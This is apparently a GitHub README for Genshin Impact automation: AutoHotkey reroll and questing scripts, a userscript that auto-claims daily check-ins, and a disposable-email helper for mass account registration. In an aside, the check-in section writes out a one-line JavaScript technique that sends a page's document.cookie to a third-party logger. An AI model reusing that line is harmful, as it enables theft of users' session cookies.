# Genshin Impact Script(s)

## IMPORTANT
Pre-made script will no longer be updated.<br>
It's not hard to if someone else tried.<br>
NOTE: I will likely be back in a year, nothing to do ingame.

## Download?
Code > Download ZIP ([Try this link](https://github.com/SlowsieNT/Genshin-Impact/archive/refs/heads/main.zip))<br>
AutoHotkey v1.x ([Website link](https://www.autohotkey.com/))<br>
Tampermonkey Chrome ([Extension link](https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo/))<br>
Tampermonkey Firefox ([Extension link](https://addons.mozilla.org/en-US/firefox/addon/tampermonkey/))<br>

## Reroll time?
Using this formula:<br>
`register_start2 - register_start = 17min, 35sec` (average)<br>
Formula covers: registration, gameplay, and wishing!<br>

## Plans?
Retrier3 is MARKED FOR "DEATH"!<br>
- Contributors needed, or pre-made script won't work in the future!
- REASON: Windows 11 will no longer allow local account.
  - It's farewell for privacy
  - It's farewell

## License
0-BSD<br>

## Available scripts:

🔗 __[Retrier3-Live](https://github.com/SlowsieNT/Genshin-Impact/tree/main/Retrier3-Live)__ is now available at GitHub!<br>
(Not a bot, it is Helper for questing)<br>
🔗 __[genshin-checkin-redeem.js](https://github.com/SlowsieNT/Genshin-Impact/blob/main/js/tampermonkey/genshin-checkin-redeem.js)__ is now available at GitHub!<br>
(Used for auto redeem check-in reward)<br>
🔗 __[quickfmg.js](https://github.com/SlowsieNT/Genshin-Impact/blob/main/js/tampermonkey/quickfmg.js)__ is now available at GitHub!<br>
(Used for auto generate random mail & copy it, and then copy verification code for mihoyo account)

## NOTE:
**retrier2** (old) will no longer be updated.<br>
*retrier2, my friend, you have served us well; **Requiescat in pace**.*

## Retrier3 (alpha)
#### Change variables in Retrier3.ahk!
- Like changing `vStandalone64Path` to skip long opening cutscene!
  - It will rename files, will NOT remove!
- Like changing `vPlayerFemale` to `0` for boy!
- Like changing `vNickname` to whatever name you wish!
- Like changing `vResolutionPostfix` to suit your screen resolution!
  - Pick between `WM1440`, and `FS1920`!!!
 
#### Supported Screen resolutions
- 1920x1080 (Fullscreen Mode)
- 1440x900 (Windowed Mode)
- No other resolutions are planned.<br>
#### Retrier3 is superior to v2
- More stable
- More code/"complex"
- "Easier" to maintain

## retrier2.ahk SETUP, same for v3 (except maintaining)
FOR pre-made script: <br>https://www.youtube.com/watch?v=7YDn-NKuO7A<br>
How to maintain: <br>https://www.youtube.com/watch?v=q0eT1Qar_nY

NOTE:
- Don't press F2 like a madman during register/login, script will break
  - Then you need to Press Home + F2
- Script can be used at ANY QUEST
  - BUT some MAY end up being STUCK in a loop (Venti's quest is just an example)
- Script can break
  - Press Home then F2 again if it escalates during Questing

### FAQ
Q: What's center of the mouse?<br>
Q: What's center of the cursor?<br>
A: Look at [this picture (*LINK*)](https://github.com/SlowsieNT/genshin/blob/main/Visuals/center-of-cursor.png)<br><br>
Q: Will the script be updated in the future?<br>
A: Yes - to keep it alive, until 2022

[TEXT] FOR pre-made script:<br>
1. Go to Settings then Graphics
2. Set Quality to: Medium
3. Set Display Mode to: 1440x900 Windowed
4. Go to Settings then Language
5. Select Subtitles to: English

## genshin-checkin-redeem.js
(requires Tampermonkey/Greasemonkey Opera/Chrome/Firefox extension)<br>
#### NOTE: Only the account that is currently logged in, I may make a script for quick multi-account in few lines(C#) in the future!<br>
Every 3h script will try to check-in<br>
__Script will trigger when you are casually watching youtube videos, or just browsing__<br>
This script will send 2 requests, one will attempt to get checkin game reward, and the other request is another checkin<br>
I have tested it on other accounts and it should be working for you as well<br>
#### ALL SERVERS
Junior Developers may freak out because they'll see error(s) in the console, in the contrary `it just works™` because request is sent, but the response cannot arrive due CORS
- This technique is very common in Hacking
  - It was being used for DoS-ing
  - Or sending `document.cookie` to the 3rd party logger website
    - Sending `document.cookie` was mostly sent via `(new Image).src="...?_="+encodeURIComponent(document.cookie)`

## quickfmg.js
(requires Tampermonkey/Greasemonkey Opera/Chrome/Firefox extension)<br>
Once you add this script and go to [fakemailgenerator.com](http://www.fakemailgenerator.com/), you would click on Logo that will have green background.<br>
Once you click on the Logo, it will copy the new generated mail automatically<br>
IMPORTANT: It will copy verification code for genshin impact account, no worries
